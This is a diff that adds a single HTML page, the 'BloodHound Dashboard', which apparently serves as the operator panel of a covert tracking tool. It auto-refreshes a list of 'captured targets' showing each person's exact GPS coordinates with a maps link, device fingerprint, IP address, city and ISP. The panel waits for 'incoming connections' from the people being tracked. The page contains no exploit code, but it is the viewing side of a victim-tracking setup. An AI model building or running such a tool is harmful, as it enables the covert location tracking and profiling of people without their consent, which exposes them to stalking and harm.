@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BloodHound Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0f;
+            --text-color: #f8fafc;
+            --glass-bg: rgba(139, 0, 0, 0.05);
+            --glass-border: rgba(220, 38, 38, 0.15);
+            --accent-color: #dc2626;
+            --accent-gradient: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+            --blood-glow: rgba(220, 38, 38, 0.3);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            background-image:
+                radial-gradient(circle at 10% 20%, rgba(220, 38, 38, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(153, 27, 27, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 50% 50%, rgba(127, 29, 29, 0.05) 0%, transparent 60%);
+            background-attachment: fixed;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            text-align: center;
+            font-weight: 700;
+            margin-bottom: 40px;
+            background: var(--accent-gradient);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 2.5rem;
+            letter-spacing: -1px;
+        }
+
+        .log-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .log-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.45);
+            border-color: rgba(220, 38, 38, 0.25);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--glass-border);
+            padding-bottom: 16px;
+            margin-bottom: 20px;
+            color: #94a3b8;
+            font-size: 0.9em;
+        }
+
+        .timestamp {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ip-badge {
+            background: rgba(220, 38, 38, 0.15);
+            color: #fca5a5;
+            padding: 4px 12px;
+            border-radius: 99px;
+            font-family: monospace;
+            font-size: 0.9em;
+            border: 1px solid rgba(220, 38, 38, 0.3);
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+        }
+
+        .data-item {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .label {
+            font-size: 0.8em;
+            color: #64748b;
+            margin-bottom: 4px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .value {
+            font-weight: 500;
+            color: #e2e8f0;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+
+        .value.highlight {
+            color: #f87171;
+            text-shadow: 0 0 20px rgba(248, 113, 113, 0.3);
+        }
+
+        .gps-link {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+            padding: 10px 24px;
+            background: var(--accent-gradient);
+            color: white;
+            text-decoration: none;
+            border-radius: 12px;
+            font-weight: 500;
+            font-size: 0.95em;
+            transition: opacity 0.2s;
+            width: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 4px 12px var(--blood-glow);
+        }
+
+        .gps-link:hover {
+            opacity: 0.9;
+        }
+
+        .refresh-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--accent-gradient);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 99px;
+            cursor: pointer;
+            box-shadow: 0 10px 25px var(--blood-glow);
+            font-weight: 600;
+            font-size: 1rem;
+            transition: transform 0.2s, box-shadow 0.2s;
+            z-index: 100;
+        }
+
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(220, 38, 38, 0.5);
+        }
+
+        .refresh-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🩸 BloodHound Dashboard</h1>
+        <div id="logs-container">
+            <div style="text-align: center; color: #64748b; margin-top: 50px;">
+                Loading captured data...
+            </div>
+        </div>
+    </div>
+    <button class="refresh-btn" onclick="fetchLogs()">Refresh Data</button>
+
+    <script>
+        async function fetchLogs() {
+            try {
+                const res = await fetch('/api/logs');
+                const logs = await res.json();
+                renderLogs(logs);
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        function renderLogs(logs) {
+            const container = document.getElementById('logs-container');
+            if (logs.length === 0) {
+                container.innerHTML = `
+                    <div style="text-align:center; padding: 40px; color: #64748b; background: rgba(255,255,255,0.02); border-radius: 16px;">
+                        <p style="font-size: 1.1em;">No targets captured yet.</p>
+                        <p style="font-size: 0.9em;">Waiting for incoming connections...</p>
+                    </div>`;
+                return;
+            }
+
+            container.innerHTML = logs.map(log => {
+                let detailsHtml = '';
+
+                const data = log.data;
+                const type = data.type || 'unknown';
+
+                if (type === 'gps') {
+                    detailsHtml = `
+                        <div class="data-item"><span class="label">Event Type</span><span class="value highlight">GPS Location</span></div>
+                        <div class="data-item"><span class="label">Latitude</span><span class="value">${data.coords.latitude}</span></div>
+                        <div class="data-item"><span class="label">Longitude</span><span class="value">${data.coords.longitude}</span></div>
+                        <div class="data-item"><span class="label">Accuracy</span><span class="value">${Math.round(data.coords.accuracy)} meters</span></div>
+                        <div style="grid-column: 1/-1">
+                            <a href="https://www.google.com/maps?q=${data.coords.latitude},${data.coords.longitude}" target="_blank" class="gps-link">
+                                View Exact Location on Maps
+                            </a>
+                        </div>
+                    `;
+                } else if (type === 'device_info') {
+                    const info = data.info;
+                    detailsHtml = `
+                        <div class="data-item"><span class="label">Event Type</span><span class="value">Device Fingerprint</span></div>
+                        <div class="data-item"><span class="label">Platform</span><span class="value">${info.platform}</span></div>
+                        <div class="data-item"><span class="label">Screen Res</span><span class="value">${info.screen.width}x${info.screen.height}</span></div>
+                        <div class="data-item"><span class="label">Language</span><span class="value">${info.language}</span></div>
+                        <div class="data-item" style="grid-column: 1/-1"><span class="label">User Agent</span><span class="value" style="font-size: 0.85em; opacity: 0.8;">${info.userAgent}</span></div>
+                    `;
+                } else if (type.startsWith('ip_')) {
+                    detailsHtml = `
+                        <div class="data-item"><span class="label">Event Type</span><span class="value">IP Trace</span></div>
+                        <div class="data-item"><span class="label">IP Address</span><span class="value">${data.ip || data.details?.query}</span></div>
+                        ${data.details ? `
+                            <div class="data-item"><span class="label">City</span><span class="value">${data.details.city || 'N/A'}</span></div>
+                            <div class="data-item"><span class="label">ISP</span><span class="value">${data.details.isp || 'N/A'}</span></div>
+                        ` : ''}
+                    `;
+                } else if (type === 'error') {
+                    detailsHtml = `
+                        <div class="data-item"><span class="label">Event Type</span><span class="value" style="color: #f87171">Error</span></div>
+                        <div class="data-item" style="grid-column: 1/-1"><span class="label">Message</span><span class="value">${data.message}</span></div>
+                    `;
+                } else {
+                    detailsHtml = `<div class="data-item"><span class="label">Raw Data</span><pre class="value" style="font-size:0.8em; overflow:auto;">${JSON.stringify(data, null, 2)}</pre></div>`;
+                }
+
+                return `
+                    <div class="log-card">
+                        <div class="meta">
+                            <div class="timestamp">
+                                <span>${new Date(log.timestamp).toLocaleString()}</span>
+                            </div>
+                            <span class="ip-badge">${log.ip}</span>
+                        </div>
+                        <div class="data-grid">
+                            ${detailsHtml}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Auto refresh every 5s
+        setInterval(fetchLogs, 5000);
+        fetchLogs();
+    </script>
+</body>
+
+</html>
